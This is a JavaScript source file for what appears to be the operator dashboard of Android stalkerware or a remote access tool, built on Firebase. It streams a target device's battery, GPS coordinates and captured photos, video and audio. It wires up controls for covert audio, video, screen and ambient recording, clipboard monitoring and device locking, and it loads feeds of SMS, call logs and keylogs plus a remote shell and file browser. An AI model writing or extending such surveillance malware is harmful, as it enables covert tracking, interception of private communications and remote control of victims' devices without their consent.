// js/view-device-control.js
import { database, ref, onValue, deviceListeners, addListener, removeListener } from './firebase-config.js';
import { injectAdvancedControls } from './ui-injector.js';
import { setupCommandListeners } from './command-handler.js';
import { initializeDataFeedListeners } from './data-feeds.js';
import { initTerminal } from './terminal-manager.js'; // ✅ NEW: Terminal Module

let currentUid = null;

export function initDeviceControl(uid) {
    if (!uid) return;
    currentUid = uid;
    window.currentDeviceUid = uid; // For global helpers in terminal-manager.js

    // 1. Clean up previous listeners
    cleanupListeners();

    // 2. Inject UI (Buttons + Panels)
    injectAdvancedControls();

    // 3. Start Telemetry (Battery, Location, Media)
    initializeTelemetryStream(uid);

    // 4. Start Command State Listeners (Toggle buttons)
    initializeCommandStateListeners(uid);

    // 5. Start Data Feeds (SMS, Calls, Keylogs, etc.)
    initializeDataFeedListeners(uid);

    // 6. Setup Command Handlers (Button clicks)
    setupCommandListeners(uid);

    // 7. Initialize Terminal (Shell + File Browser) ✅ NEW
    initTerminal(uid);
}

function cleanupListeners() {
    Object.keys(deviceListeners).forEach(key => {
        if (key.includes(currentUid || '')) {
            removeListener(key);
        }
    });
}

function initializeTelemetryStream(uid) {
    const statusRef = ref(database, `devices/${uid}/status`);
    const key = `status-${uid}`;
    removeListener(key);
    
    const listener = onValue(statusRef, (snap) => {
        if (!snap.exists()) return;
        const d = snap.val();
        
        if (document.getElementById('battery-text')) {
            document.getElementById('battery-text').textContent = d.batteryPercentage !== undefined ? `${d.batteryPercentage}%` : "--%";
            const bar = document.getElementById('battery-bar');
            if (bar) bar.style.width = `${d.batteryPercentage || 0}%`;
        }

        if (document.getElementById('latitude-text') && d.latitude != null) {
            document.getElementById('latitude-text').textContent = parseFloat(d.latitude).toFixed(6);
            document.getElementById('longitude-text').textContent = parseFloat(d.longitude).toFixed(6);
            const ml = document.getElementById('map-link');
            if (ml) ml.href = `https://www.google.com/maps/search/?api=1&query=${d.latitude},${d.longitude}`;
        }

        const ls = document.getElementById('last-seen-text');
        if (ls && (d.last_seen || d.lastSeen)) ls.textContent = new Date(d.last_seen || d.lastSeen).toLocaleString();

        handleMediaPreview(d);
    });
    addListener(key, listener);
}

function handleMediaPreview(d) {
    const img = document.getElementById('cameraPreviewFrame');
    const vid = document.getElementById('mediaVideoPlayer');
    const aud = document.getElementById('mediaAudioPlayer');
    const audC = document.getElementById('audio-container');
    const ph = document.getElementById('mediaPlaceholderText');
    const ts = document.getElementById('captureTimestamp');

    const hideAll = () => { 
        if(img) img.style.display='none'; 
        if(vid){vid.style.display='none';vid.pause();} 
        if(aud){aud.style.display='none';aud.pause();} 
        if(audC) audC.style.display='none'; 
        if(ph) ph.style.display='block'; 
    };

    const photoUrl = d.lastPhotoUrl || d.last_photo_url;
    const videoUrl = d.lastVideoUrl || d.last_video_url;
    const audioUrl = d.lastAudioUrl || d.last_audio_url;
    let active = false;

    if (photoUrl && img) { hideAll(); img.src = photoUrl + (photoUrl.startsWith('data:') ? '' : `?t=${Date.now()}`); img.style.display='block'; active=true; }
    else if (videoUrl && vid) { hideAll(); if(vid.src!==videoUrl){vid.src=videoUrl;vid.load();} vid.style.display='block'; active=true; }
    else if (audioUrl && aud) { hideAll(); if(aud.src!==audioUrl){aud.src=audioUrl;aud.load();} aud.style.display='block'; if(audC) audC.style.display='block'; active=true; }

    if (active && ts) ts.innerText = `LAST UPDATED: ${new Date().toLocaleTimeString()}`;
    else if (!active && ph) ph.style.display = 'block';
}

function initializeCommandStateListeners(uid) {
    const commandsRef = ref(database, `devices/${uid}/commands`);
    const key = `commands-${uid}`;
    removeListener(key);

    const listener = onValue(commandsRef, (snap) => {
        const cmd = snap.val() || {};
        updateButtonState('cmd-flashlight', cmd.flashlight);
        updateButtonState('cmd-alarm', cmd.alarm);
        updateButtonState('cmd-lock', cmd.emergencyLock);
        updateButtonState('cmd-audio', cmd.record_audio);
        updateButtonState('cmd-video', cmd.record_video);
        updateButtonState('cmd-ambient', cmd.start_ambient);
        updateButtonState('cmd-screenrec', cmd.record_screen);
        updateButtonState('cmd-clipboard', cmd.monitor_clipboard);
        
        const ti = document.getElementById('time-setter');
        if (ti && cmd.activation_time && document.activeElement !== ti) ti.value = cmd.activation_time;
    });
    addListener(key, listener);
}

function updateButtonState(btnId, isActive) {
    const btn = document.getElementById(btnId); 
    if(!btn) return;
    btn.classList.toggle('active', !!isActive);
    const s = btn.querySelector('.toggle-state');
    if(s){
        if(s.textContent==='REC'||s.textContent==='UPD...'||s.textContent.startsWith('SEG')||s.textContent==='SENT ✓'||s.textContent.endsWith('SEGS')) return; 
        s.textContent=isActive?'ON':'OFF'; 
        s.style.color=isActive?'#00ff88':'#666'; 
        s.style.fontWeight=isActive?'bold':'normal';
    }
    btn.style.borderColor = isActive ? '#00ff88' : (btnId.includes('danger') ? '#ff6b6b' : '#333');
    btn.style.opacity = isActive ? '1' : '0.7';
}
